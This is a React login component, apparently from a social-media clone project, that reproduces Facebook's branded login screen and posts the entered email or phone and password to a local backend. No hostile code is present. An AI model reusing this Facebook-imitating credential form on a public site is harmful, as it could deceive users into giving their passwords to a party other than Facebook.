import React, { useState } from 'react'
import { Link, useNavigate } from 'react-router-dom';

const FLogin = () => {
    const [formData, setFormData] = useState({
        identifier: '',
        password: ''
    });
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    
    const navigate = useNavigate();

    const handleChange = (e) => {
        setFormData({
            ...formData,
            [e.target.name]: e.target.value
        });
        setError('');
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError('');

        try {
            const response = await fetch('http://localhost:5000/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    identifier: formData.identifier,
                    password: formData.password,
                    platform: 'facebook'
                })
            });

            const data = await response.json();

            if (response.ok) {
                localStorage.setItem('token', data.token);
                localStorage.setItem('user', JSON.stringify(data.user));
                navigate('/facebook-home');
            } else {
                setError(data.message || 'Login failed');
            }
        } catch (error) {
            console.error('Login error:', error);
            setError('Network error. Please try again.');
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div className="w-full max-w-md">
                <div className="text-center mb-8">
                    <h1 className="text-5xl font-bold text-blue-600">facebook</h1>
                </div>
                <div className="bg-white rounded-lg shadow-lg p-6">
                    <h2 className="text-lg font-medium text-gray-800 text-center mb-6">
                        Log in to Facebook
                    </h2>

                    {error && (
                        <div className="mb-4 p-3 bg-red-100 border border-red-400 rounded text-red-700 text-sm">
                            {error}
                        </div>
                    )}

                    <form onSubmit={handleSubmit} className="space-y-4">
                        <input
                            type="text"
                            name="identifier"
                            value={formData.identifier}
                            onChange={handleChange}
                            className="w-full px-4 py-3 border border-gray-300 rounded-md bg-gray-50 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            placeholder="Mobile number or email address"
                            required
                        />
                        <input
                            type="password"
                            name="password"
                            value={formData.password}
                            onChange={handleChange}
                            className="w-full px-4 py-3 border border-gray-300 rounded-md bg-gray-50 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            placeholder="Password"
                            required
                        />
                        <button 
                            type="submit"
                            disabled={loading}
                            className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold py-3 px-4 rounded-md transition duration-200"
                        >
                            {loading ? 'Logging in...' : 'Log in'}
                        </button>
                    </form>
                    <div className="mt-6 text-center space-x-4">
                        <a href="#" className="text-blue-600 hover:underline text-sm">
                            Forgotten account?
                        </a>
                        <Link to="/fsignup" className="text-blue-600 hover:underline text-sm">
                            Sign up for Facebook
                        </Link>
                    </div>
                </div>
            </div>
        </div>
    )
}

export default FLogin